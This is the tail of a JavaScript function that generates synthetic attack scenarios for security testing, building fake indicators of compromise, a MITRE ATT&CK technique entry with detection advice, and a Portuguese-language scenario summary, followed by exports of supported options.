    { type: "url", value: `https://${pick(EXTERNAL_DOMAINS)}/api/checkin`, confidence: 0.76 },
    { type: "sha256", value: randomHash(input.attackType), confidence: 0.84 },
    { type: "user_agent", value: pick(USER_AGENTS), confidence: 0.62 }
  ];

  const ttps = [
    {
      tactic: technique.tactic,
      technique: technique.technique,
      subTechnique: technique.subTechnique || null,
      mitreId: technique.id,
      severity: input.severity,
      confidence: technique.confidence,
      riskScore: technique.riskScore,
      detection: technique.detection,
      recommendation: technique.recommendation
    }
  ];

  const summary = `Cenário sintético para ${input.companyType} com ${input.assetCount} ativos e ${input.userCount} usuários. Simulação de ${input.attackType} por ${input.durationHours} hora(s), ruído benigno de ${input.noiseLevel}%, severidade ${input.severity} e fontes ${vendors}. Técnica principal ${technique.id} - ${technique.technique}.`;

  return { name, summary, timeline, iocs, ttps };
}

export const supportedManufacturers = MANUFACTURERS;
export const supportedEvents = EVENT_TYPES;
export const supportedSeverities = SEVERITIES;
export const supportedModes = SIMULATION_MODES;
